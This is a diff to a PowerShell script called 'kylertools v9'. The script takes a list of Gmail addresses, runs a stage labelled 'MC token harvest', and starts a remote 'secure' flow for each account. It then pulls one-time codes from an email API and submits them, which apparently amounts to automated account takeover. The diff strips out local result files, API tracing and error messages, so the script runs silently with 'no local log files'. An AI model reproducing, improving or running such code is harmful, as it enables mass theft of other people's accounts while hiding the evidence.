@@ -1,6 +1,6 @@
 # language: PowerShell 5.1+, target: Windows 11
-# kylertools v9 — per-email pipeline, skip-on-error, results to %TEMP%\kt_results.txt
-# silent, inline, key in file
+# kylertools v9 — per-email pipeline, skip-on-error, silent, inline, key in file
+# results handled by autosecure server-side; no local log files
 
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
@@ -16,7 +16,6 @@ $METHOD     = "otp"
 
 $POLL_MS    = 3000
 $OTP_WAIT_S = 180
-$RESULT_FILE = Join-Path $env:TEMP "kt_results.txt"
 
 $HDR = @{
     "Authorization" = "Bearer $API_KEY"
@@ -26,7 +25,7 @@ $nl = [char]10
 # ======================================================
 
 # =================== TEST OVERRIDE ====================
-# $gmailList = @("bantqq1@gmail.com")
+# $gmailList = @("your-test@gmail.com")
 # ======================================================
 
 # ---------- stage 1: MC token harvest ----------
@@ -314,17 +313,6 @@ if($callerOverride){
 }
 
 # ==================== got-beamed API layer ====================
-$apiTrace      = @()
-$API_TRACE_MAX = 200
-
-function Trace-Add {
-    param($obj)
-    $script:apiTrace += $obj
-    if($script:apiTrace.Count -gt $API_TRACE_MAX){
-        $script:apiTrace = $script:apiTrace[-$API_TRACE_MAX..-1]
-    }
-}
-
 function Api-Post {
     param([string]$path, [hashtable]$body)
     $url = "$API_BASE$path"
@@ -402,64 +390,40 @@ function Secure-Start {
     param([string]$email)
     $resp = Api-Post -path "/secure" -body @{ method=$METHOD; email=$email }
     $j = J $resp.content
-    Trace-Add ([PSCustomObject]@{
-        call="secure.start"; status="HTTP_$($resp.status)"; email=$email;
-        body=($resp.content -replace "\s+"," ")
-    })
-    if(-not $resp.ok -or -not $j -or -not $j.success){
-        return @{ ok=$false; err="start_http_$($resp.status) :: $(($resp.content -replace '\s+',' '))" }
-    }
+    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false } }
     $d = $j.data
-    if(-not $d){
-        return @{ ok=$false; err="start_empty_data :: $(($resp.content -replace '\s+',' '))" }
-    }
+    if(-not $d){ return @{ ok=$false } }
     $sentTo = ""
     if($d.PSObject.Properties['accounts']){
         $accts = @($d.accounts)
-        if($accts.Count -gt 0 -and $accts[0]){
-            $sentTo = [string]$accts[0].sentTo
-        }
+        if($accts.Count -gt 0 -and $accts[0]){ $sentTo = [string]$accts[0].sentTo }
     }
-    # fallback: if API doesn't echo a sentTo, use the email we submitted
     if(-not $sentTo){ $sentTo = $email }
-    $badShape = $false
-    if($d.statusUrl -and $d.statusUrl -notmatch '^/'){ $badShape = $true }
-    if($d.submitUrl -and $d.submitUrl -notmatch '^/'){ $badShape = $true }
     return @{
         ok=$true; taskId=$d.taskId; statusUrl=$d.statusUrl;
-        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo;
-        shapeWarn = $badShape
+        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo
     }
 }
 
 function Secure-SubmitOtp {
     param([string]$submitPath,[string]$otp)
     $resp = Api-Post -path $submitPath -body @{ otp=$otp }
-    Trace-Add ([PSCustomObject]@{
-        call="secure.otp"; status="HTTP_$($resp.status)";
-        body=($resp.content -replace "\s+"," ")
-    })
     $j = J $resp.content
     if($resp.ok -and $j -and $j.success){ return @{ ok=$true } }
-    return @{ ok=$false; err="submit_http_$($resp.status) :: $(($resp.content -replace '\s+',' '))" }
+    return @{ ok=$false }
 }
 
 function Secure-TaskState {
     param([string]$taskPath)
     $resp = Api-Get -path $taskPath
     $j = J $resp.content
-    Trace-Add ([PSCustomObject]@{
-        call="task.get"; status="HTTP_$($resp.status)";
-        body=($resp.content -replace "\s+"," ")
-    })
-    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false; err="state_http_$($resp.status)" } }
+    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false } }
     return @{ ok=$true; data=$j.data }
 }
 
 function Emails-FindOtp {
     param([string]$email,[int]$waitSec=180)
     $deadline = (Get-Date).AddSeconds($waitSec)
-    $lastSaw = ""
     $seenIds = @{}
     while((Get-Date) -lt $deadline){
         $resp = Api-Get -path "/emails"
@@ -476,7 +440,6 @@ function Emails-FindOtp {
             }
             foreach($it in $items){
                 if(-not $it){ continue }
-                # skip already-checked emails to avoid re-parsing
                 $id = ""
                 foreach($k in @("id","messageId","uid")){
                     if($it.PSObject.Properties[$k] -and $it.$k){ $id = [string]$it.$k; break }
@@ -484,7 +447,6 @@ function Emails-FindOtp {
                 if($id -and $seenIds.ContainsKey($id)){ continue }
                 if($id){ $seenIds[$id] = $true }
 
-                # only look at mails addressed to our target if we can tell
                 $blob = ""
                 try { $blob = ($it | ConvertTo-Json -Compress -Depth 8) } catch { continue }
                 if($email -and $email -notmatch '\*'){
@@ -496,58 +458,32 @@ function Emails-FindOtp {
                 }
                 $code = Extract-Otp $blob
                 if($code){ return @{ ok=$true; otp=$code } }
-                if(-not $lastSaw){ $lastSaw = $blob.Substring(0,[Math]::Min(400,$blob.Length)) }
             }
-            if($items.Count -eq 0 -and -not $lastSaw){ $lastSaw = "/emails empty" }
-        } else {
-            $lastSaw = "emails_http_$($resp.status)"
         }
         Start-Sleep -Milliseconds $POLL_MS
     }
-    return @{ ok=$false; err="otp_timeout :: $lastSaw" }
+    return @{ ok=$false }
 }
 
 # ==================== run the flow ====================
-function Write-Result {
-    param([string]$line)
-    $script:secureResults += $line
-    try { $line | Out-File -FilePath $RESULT_FILE -Append -Encoding utf8 } catch {}
-}
-
-$secureResults = @()
-try { Remove-Item $RESULT_FILE -EA 0 } catch {}
-
 if($script:gmailList.Count -gt 0){
-    Write-Result "== run start :: $((Get-Date).ToString('s')) :: $($script:gmailList.Count) emails =="
     foreach($email in $script:gmailList){
         try {
             $s = Secure-Start -email $email
-            if(-not $s.ok){
-                Write-Result "$email :: SKIP_START_FAIL :: $($s.err)"
-                continue
-            }
+            if(-not $s.ok){ continue }
 
             $otpRes = Emails-FindOtp -email $s.sentTo -waitSec $OTP_WAIT_S
-            if(-not $otpRes.ok){
-                Write-Result "$email :: SKIP_OTP_TIMEOUT :: $($otpRes.err)"
-                continue
-            }
+            if(-not $otpRes.ok){ continue }
 
             $sub = Secure-SubmitOtp -submitPath $s.submitUrl -otp $otpRes.otp
-            if(-not $sub.ok){
-                Write-Result "$email :: SKIP_SUBMIT_FAIL :: $($sub.err)"
-                continue
-            }
+            if(-not $sub.ok){ continue }
 
             Start-Sleep -Milliseconds 1500
             $ts = Secure-TaskState -taskPath $s.statusUrl
-            $final = if($ts.ok){ ($ts.data | ConvertTo-Json -Compress -Depth 10) } else { $ts.err }
-            $warn = if($s.shapeWarn){ " [URL-SHAPE-WARN]" } else { "" }
-            Write-Result "$email :: OK :: otp=$($otpRes.otp) ::$warn $final"
         } catch {
-            Write-Result "$email :: SKIP_EXCEPTION :: $($_.Exception.Message)"
             continue
         }
     }
-    Write-Result "== run end :: $((Get-Date).ToString('s')) =="
 }
+
+} catch {}
